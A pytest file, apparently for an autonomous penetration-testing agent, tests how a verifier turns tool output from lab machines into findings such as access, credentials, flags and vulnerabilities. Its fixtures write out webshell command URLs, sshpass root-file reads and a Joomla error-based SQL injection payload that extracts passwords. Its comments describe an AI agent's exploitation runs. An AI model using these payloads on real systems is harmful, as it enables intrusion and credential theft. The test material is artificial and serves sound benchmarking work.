        "sshpass -p 'cyber' ssh mitch@10.64.128.102 'cat /root/root.txt'",
        'W3ll d0n3. You made it!\nno es una flag\n',
    )

    assert 'loot' not in {row['fact_type'] for row in rows}


def test_shell_exec_does_not_call_a_sudo_rule_root(tmp_path, monkeypatch):
    """``sudo -l`` proves a capability, not an identity: no ``privilege`` fact."""
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))

    rows = _shell_sshpass(
        "sshpass -p 'cyber' ssh mitch@10.64.128.102 'sudo -l'",
        'Matching Defaults entries for mitch on ip-10-64-128-102:\n'
        '    env_reset, mail_badpass\nUser mitch may run the following commands:\n'
        '    (root) NOPASSWD: /usr/bin/vim\n',
    )

    assert {row['fact_type'] for row in rows} == {'access', 'credential'}


def test_shell_exec_derives_nothing_from_a_failed_login():
    """A wrong password exits 5: the channel was refused, so nothing is proven."""
    rows = _shell_sshpass(
        "sshpass -p 'wrong' ssh mitch@10.64.128.102 'id'",
        'Permission denied, please try again.\n', exit_code=5,
    )
    assert rows == []


def test_shell_exec_derives_nothing_without_an_sshpass_login():
    """A local command is not a channel; a lookup is not a login."""
    assert _shell_sshpass('cat /tmp/flag.txt', 'flag{fake_flag}\n') == []
    assert _shell_sshpass('command -v sshpass', '/usr/bin/sshpass\n') == []
    assert _shell_sshpass(
        'sshpass -p x scp /tmp/a mitch@10.64.128.102:/tmp/b', ''
    ) == []
    # A branch that never ran cannot prove a channel either.
    assert _shell_sshpass(
        "if [ 1 = 0 ]; then sshpass -p x ssh mitch@10.64.128.102 'id'; fi", 'done\n'
    ) == []


def test_sshpass_channels_reads_the_native_client_argv():
    from nexus_core.kernel.fact_verification import sshpass_channels

    channels = sshpass_channels(
        "timeout 30 sshpass -f /tmp/pw ssh -o Port=2222 -l mitch 10.64.128.102 'sudo -l'"
    )
    assert [(channel.target, channel.username, channel.port, channel.command,
             channel.password) for channel in channels] == [
        ('10.64.128.102', 'mitch', 2222, 'sudo -l', ''),
    ]
    # Two logins to different hosts in one line: their output is mixed, so the
    # channel is all that can be attributed.
    mixed = sshpass_channels(
        "sshpass -p a ssh one@10.0.0.1 'id'; sshpass -p b ssh two@10.0.0.2 'id'"
    )
    assert [channel.target for channel in mixed] == ['10.0.0.1', '10.0.0.2']
    assert sshpass_channels('sshpass -p a ssh') == ()


# ------------- Vulnversity: the flag is whatever text the flag file holds
#: The room's ``user.txt`` is an MD5, not a ``flag{fake_flag}`` token. The verifier must
#: promote the read by the *path* it proved, never by guessing a format.
MD5_FLAG = "8bd7992fbe8a6ad22a63361004cfcedb"


def test_verifier_promotes_a_flag_file_whose_content_is_a_hash():
    loot = [row for row in _ssh_read('cat user.txt', MD5_FLAG + '\n')
            if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == [MD5_FLAG]
    assert loot[0]['value']['path'] == 'user.txt'
    assert loot[0]['verified'] is True
    # The planner reads it as captured loot: the hash has no ``flag{fake_flag}`` shape.
    from nexus_core.agent.planner import loot_is_evidence

    assert loot_is_evidence(loot[0]['value']) is True


def test_verifier_attributes_the_trailing_read_of_a_chain():
    """Measured shape: ``id; hostname; cat /home/mitch/user.txt 2>/dev/null``."""
    rows = _ssh_read(
        'id; hostname; cat /home/mitch/user.txt 2>/dev/null',
        'uid=1001(mitch) gid=1001(mitch)\nMachine\n' + MD5_FLAG + '\n',
    )
    loot = [row for row in rows if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == [MD5_FLAG]
    assert loot[0]['value']['path'] == '/home/mitch/user.txt'


def test_verifier_reads_a_powershell_get_content_over_ssh():
    loot = [row for row in _ssh_read('Get-Content /home/mitch/user.txt', MD5_FLAG)
            if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == [MD5_FLAG]


def test_verifier_promotes_the_text_a_winrm_read_printed():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.0.0.5',
                    command='Get-Content C:\\Users\\tom\\Desktop\\user.txt',
                    stdout=MD5_FLAG + '\n'),
        verified=True, verification_method='winrm_command_executed')

    rows = derive_assertions(
        'nexus.win.winrm_exec', {'username': 'tom', 'domain': 'corp.local'}, result, context)
    loot = [row for row in rows if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == [MD5_FLAG]
    assert loot[0]['value']['path'] == 'C:\\Users\\tom\\Desktop\\user.txt'


def test_verifier_does_not_promote_a_hash_from_a_plain_listing():
    """A file that merely *contains* a hash is not the flag file being read."""
    rows = _ssh_read('find / -name "*.txt" 2>/dev/null', MD5_FLAG + '\n')
    assert 'loot' not in {row['fact_type'] for row in rows}


def test_a_chained_read_that_is_not_last_is_still_not_loot():
    """Later output contaminates the tail: nothing is attributed to the file."""
    rows = _ssh_read('id; cat user.txt; ls', 'uid=1001\n' + MD5_FLAG + '\nnotes.txt\n')
    assert 'loot' not in {row['fact_type'] for row in rows}


def test_shell_exec_attributes_the_trailing_read_of_a_chain(tmp_path, monkeypatch):
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))

    rows = _shell_sshpass(
        "sshpass -p 'cyber' ssh -p 2222 mitch@10.64.128.102 "
        "'id; hostname; cat /home/mitch/user.txt 2>/dev/null'",
        'uid=1001(mitch) gid=1001(mitch)\nMachine\n' + MD5_FLAG + '\n',
    )
    loot = [row for row in rows if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == [MD5_FLAG]
    assert loot[0]['value']['path'] == '/home/mitch/user.txt'


# ------------------- web command channels (Vulnversity 2026-10-19 autopsy)
# ``MD5_FLAG`` is defined with the SSH fixtures above (Vulnversity's user flag).
ROOT_MD5 = 'a58ff8579f0a9270368d33a9966c7fd5'


def _web_request(url, body):
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    result = ToolResult(
        output=dict(url=url, status=200, body_preview=body),
        verified=True,
        verification_method='http_response_received',
    )
    return derive_assertions('nexus.web.request', {'url': url}, result,
                             SimpleNamespace(invocation_id='i', run_id='r'))


def _shell_curl(command, summary, *, exit_code=0):
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    result = ToolResult(
        output=dict(summary=summary, exit_code=exit_code, timed_out=False,
                    cancelled=False, artifact_ref='artifact_x'),
        verified=exit_code == 0,
        verification_method='shell_exit_code',
        exit_code=exit_code,
    )
    return derive_assertions('nexus.shell.exec', {'command': command}, result,
                             SimpleNamespace(invocation_id='i', run_id='r'))


def test_web_request_derives_access_from_a_webshell_identity_line():
    """Vulnversity: the uploaded ``.phtml`` retyped ``uid=33(www-data)``.

    Measured on 2026-10-19: the model got that exact line and recorded ``access``
    as a hypothesis the verifier could not corroborate, so ``exploitation``
    stayed *current* for 35 turns while a working command channel was open.
    """
    url = 'http://10.67.167.128:3333/internal/uploads/shell.phtml?c=id'
    rows = _web_request(url, 'PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)\n')

    access = next(row for row in rows if row['fact_type'] == 'access')
    assert access['target'] == '10.67.167.128'
    assert access['value']['transport'] == 'http'
    assert access['value']['uid'] == 33 and access['value']['user'] == 'www-data'
    assert access['verification_method'] == 'web_command_completed'
    assert 'privilege' not in {row['fact_type'] for row in rows}


def test_web_request_derives_root_and_the_plain_text_flag():
    """A command channel that prints ``uid=0(root)`` and reads ``root.txt``."""
    url = ('http://10.67.167.128:3333/internal/uploads/shell.phtml'
           '?c=id%3B%20cat%20/root/root.txt')
    rows = _web_request(url, f'uid=0(root) gid=0(root) groups=0(root)\n{ROOT_MD5}\n')

    privilege = next(row for row in rows if row['fact_type'] == 'privilege')
    assert privilege['value'] == {'uid': 0, 'user': 'root', 'via': 'web'}
    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == ROOT_MD5
    assert loot['value']['path'] == '/root/root.txt'
    assert loot['key'] == 'http:file:/root/root.txt'


def test_web_request_derives_nothing_without_a_command_parameter():
    """A page that happens to print ``uid=`` is not a proven channel."""
    rows = _web_request('http://10.67.167.128:3333/server-status',
                        'uid=33(www-data) gid=33(www-data)\n')
    assert rows == []


# --------------- error-based SQL injection (joomla run 2026-10-20 autopsy)
JOOMLA_SQLI_URL = (
    'http://10.64.152.23/index.php?option=com_fields&view=fields&layout=modal'
    '&list[fullordering]=extractvalue(1,concat(0x7e,(select%20password%20from%20jos_users)))'
)


def test_web_request_derives_a_vulnerability_from_a_database_error():
    """The engine answered the payload, so the endpoint is provably injectable.

    Measured in ``run_c71035d9818047eaa80dfd859e887b7c`` (2026-10-20): 50 turns
    of error-based extraction, ``blackboard_delta = 0`` every turn and 0
    findings, because ``nexus.web.request`` derived nothing from a response that
    carried ``XPATH syntax error: '~...'``.
    """
    body = "<br /><b>Warning</b>: XPATH syntax error: '~joomla~' in <b>.../query.php</b>"
    rows = _web_request(JOOMLA_SQLI_URL, body)

    vuln = next(row for row in rows if row['fact_type'] == 'vulnerability')
    assert vuln['target'] == '10.64.152.23'
    assert vuln['value']['class'] == 'error-based SQL injection'
    assert vuln['value']['dbms'] == 'mysql'
    assert vuln['value']['parameter'] == 'list[fullordering]'
    assert vuln['verification_method'] == 'http_sql_error'
    assert vuln['verified'] is True


def test_the_injected_bytes_never_land_on_the_board():
    """The fact names the engine, not the leaked credential material."""
    body = "XPATH syntax error: '~$2y$10$0veO/JSFh4389Lluc4Xya.df2MF.bZhz0jVMw~'"
    rows = _web_request(JOOMLA_SQLI_URL, body)

    import json

    assert '$2y$' not in json.dumps(rows)


def test_the_sqli_fact_reaches_the_ledger_branch_that_owns_it():
    """The vector has to be attributable to its own port.

    ``build_coverage`` only ties a fact to a service when the text carries the
    host *and* a scheme/port/service token; a key of just the host would leave
    ``vectors = 0`` and the loop's stall reflex would be free to close a branch
    that provably has a working vector.
    """
    import json

    from nexus_core.agent.coverage import STATUS_PENDING, STATUS_PROBED, build_coverage

    rows = _web_request(
        JOOMLA_SQLI_URL, "<br /><b>Warning</b>: XPATH syntax error: '~joomla~'"
    )
    vuln = next(row for row in rows if row['fact_type'] == 'vulnerability')
    # The endpoint, never the injected query string.
    assert vuln['value']['url'] == 'http://10.64.152.23/index.php'
    assert 'extractvalue' not in json.dumps(vuln)

    coverage = build_coverage([
        {'fact_type': 'service', 'key': '10.64.152.23:80:tcp',
         'value': {'port': 80, 'protocol': 'tcp', 'service': 'http'}},
        {'fact_type': 'vulnerability', 'key': vuln['target'],
         'value': vuln['value']},
    ])
    entry = coverage.find('10.64.152.23:80')
    assert entry.status == STATUS_PROBED
    assert entry.vector_count == 1
    # The path is visible, not just counted: B2 gave each vector its own entry.
    assert entry.vectors[0].label.startswith('error-based SQL injection')
    assert entry.vectors[0].status == STATUS_PENDING


def test_web_request_does_not_call_a_plain_page_injectable():
    """A payload that did not break anything proves nothing."""
    rows = _web_request(JOOMLA_SQLI_URL, '<html><body>Joomla! 3.7.0</body></html>')
    assert rows == []


def test_a_database_error_nobody_caused_is_not_a_finding():
    """A stale error on a plain page is not evidence the endpoint is injectable."""
    rows = _web_request(
        'http://10.64.152.23/status',
        'You have an error in your SQL syntax; check the manual',
    )
    assert rows == []


def test_shell_exec_derives_the_webshell_channel_from_curl():
    """The measured command: ``curl 'http://.../shell.phtml?c=id'``."""
    rows = _shell_curl(
        "curl -s 'http://10.67.167.128:3333/internal/uploads/shell.phtml?c=id'",
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n',
    )
    access = next(row for row in rows if row['fact_type'] == 'access')
    assert access['target'] == '10.67.167.128'
    assert access['value']['transport'] == 'http'
    assert access['verification_method'] == 'web_command_completed'


def test_shell_exec_reads_the_flag_from_a_data_urlencode_webshell():
    """``curl -G ... --data-urlencode 'c=cat /home/bill/user.txt'`` is a read."""
    rows = _shell_curl(
        "curl -s -G 'http://10.67.167.128:3333/internal/uploads/shell.phtml' "
        "--data-urlencode 'c=cat /home/bill/user.txt'",
        MD5_FLAG + '\n',
    )
    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == MD5_FLAG
    assert loot['value']['path'] == '/home/bill/user.txt'


def test_shell_exec_does_not_promote_a_plain_page_or_a_local_file():
    assert _shell_curl(
        "curl -s 'http://10.67.167.128:3333/server-status'",
        'uid=33(www-data) gid=33(www-data)\n',
    ) == []
    # A local ``cat`` of a file with a flag-shaped line is not a remote channel.
    assert _shell_curl('cat /tmp/notes.txt', 'flag{fake_flag}\n') == []


def test_a_failed_read_is_not_loot_on_the_web_channel():
    """Measured after the first web fix: ``Permission denied`` counted as a flag.

    The webshell answers 200 even when the remote ``cat`` fails, so the text has
    to be inspected. The bench must not award ``root.txt`` for the error line.
    """
    url = ('http://10.67.167.128:3333/internal/uploads/shell.phtml'
           '?c=cat%20/root/root.txt%202%3E%261')
    rows = _web_request(url, 'cat: /root/root.txt: Permission denied\n')
    assert 'loot' not in {row['fact_type'] for row in rows}

    rows = _shell_curl(
        "curl -s 'http://10.67.167.128:3333/internal/uploads/shell.phtml?c=cat%20/root/root.txt'",
        'cat: /root/root.txt: Permission denied\n',
    )
    assert 'loot' not in {row['fact_type'] for row in rows}


def test_a_real_read_after_a_denied_one_is_still_loot():
    """The filter is per line, not per channel: once root reads it, it counts."""
    url = ('http://10.67.167.128:3333/internal/uploads/shell.phtml'
           '?c=cat%20/root/root.txt')
    rows = _web_request(url, ROOT_MD5 + '\n')
    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == ROOT_MD5


def test_webshell_markup_is_not_the_flag():
    """A ``<pre>`` wrapper is not loot; the payload inside it is.

    Measured in Vulnversity (2026-10-19, second post-fix run): the shell wrapped
    every answer in ``<pre>…</pre>`` and the last line of ``cat root.txt`` was
    ``</pre>``, which the bench counted as a flag. Markup has to be stripped
    before the text is attributed to the file.
    """
    url = ('http://10.67.167.128:3333/internal/uploads/shell.phtml'
           '?cmd=cat%20/root/root.txt')
    rows = _web_request(url, f'<pre>{ROOT_MD5}\n</pre>')
    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == ROOT_MD5

    rows = _web_request(url, '<pre></pre>')
    assert 'loot' not in {row['fact_type'] for row in rows}
